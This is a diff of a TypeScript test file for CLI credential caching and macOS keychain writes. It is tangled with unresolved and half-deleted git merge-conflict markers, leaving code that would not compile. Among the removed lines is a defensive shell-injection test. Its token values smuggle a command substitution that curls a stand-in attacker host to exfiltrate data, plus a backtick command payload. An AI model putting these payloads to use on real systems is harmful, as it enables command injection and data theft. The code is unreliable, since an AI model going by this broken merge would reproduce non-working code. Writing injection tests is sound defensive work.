@@ -1,20 +1,13 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
 
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-=======
-import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
->>>>>>> a1cb700a0 (test: dedupe and optimize test suites):src/agents/cli-credentials.test.ts
 
 const execSyncMock = vi.fn();
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
-=======
 const execFileSyncMock = vi.fn();
 const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
 <<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
->>>>>>> 50805d897 (test(agents): dedupe patch and cli credential assertions):src/agents/cli-credentials.test.ts
 =======
 let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
 let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
@@ -74,18 +67,12 @@ describe("cli credentials", () => {
 
   afterEach(() => {
     vi.useRealTimers();
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
     execSyncMock.mockReset();
-=======
-    execSyncMock.mockClear().mockImplementation(() => undefined);
-    execFileSyncMock.mockClear().mockImplementation(() => undefined);
->>>>>>> cf570d3b4 (test(agents): avoid full mock resets in cli credential specs):src/agents/cli-credentials.test.ts
     delete process.env.CODEX_HOME;
     resetCliCredentialCachesForTest();
   });
 
   it("updates the Claude Code keychain item in place", async () => {
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
     const commands: string[] = [];
 
     execSyncMock.mockImplementation((command: unknown) => {
@@ -104,9 +91,6 @@ describe("cli credentials", () => {
 
       return "";
     });
-=======
-    mockExistingClaudeKeychainItem();
->>>>>>> f717a1303 (refactor(agent): dedupe harness and command workflows):src/agents/cli-credentials.test.ts
 
     const ok = writeClaudeCliKeychainCredentials(
       {
@@ -120,43 +104,8 @@ describe("cli credentials", () => {
     expect(ok).toBe(true);
     expect(commands.some((cmd) => cmd.includes("delete-generic-password"))).toBe(false);
 
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
     const updateCommand = commands.find((cmd) => cmd.includes("add-generic-password"));
     expect(updateCommand).toContain("-U");
-=======
-    // Verify execFileSync was called with array args (no shell interpretation)
-    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
-    const addCall = getAddGenericPasswordCall();
-    expect(addCall?.[0]).toBe("security");
-    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
-  });
-
-  it("prevents shell injection via untrusted token payload values", async () => {
-    const cases = [
-      {
-        access: "x'$(curl attacker.com/exfil)'y",
-        refresh: "safe-refresh",
-        expectedPayload: "x'$(curl attacker.com/exfil)'y",
-      },
-      {
-        access: "safe-access",
-        refresh: "token`id`value",
-        expectedPayload: "token`id`value",
-      },
-    ] as const;
-
-    for (const testCase of cases) {
-      execFileSyncMock.mockClear();
-      mockExistingClaudeKeychainItem();
-
-<<<<<<< HEAD:src/agents/cli-credentials.e2e.test.ts
-    // Backtick payload must be passed literally, not interpreted
-    const addCall = getAddGenericPasswordCall();
-    const args = (addCall?.[1] as string[] | undefined) ?? [];
-    const wIndex = args.indexOf("-w");
-    const passwordValue = args[wIndex + 1];
-    expect(passwordValue).toContain(backtickPayload);
->>>>>>> f717a1303 (refactor(agent): dedupe harness and command workflows):src/agents/cli-credentials.test.ts
 =======
       const ok = writeClaudeCliKeychainCredentials(
         {
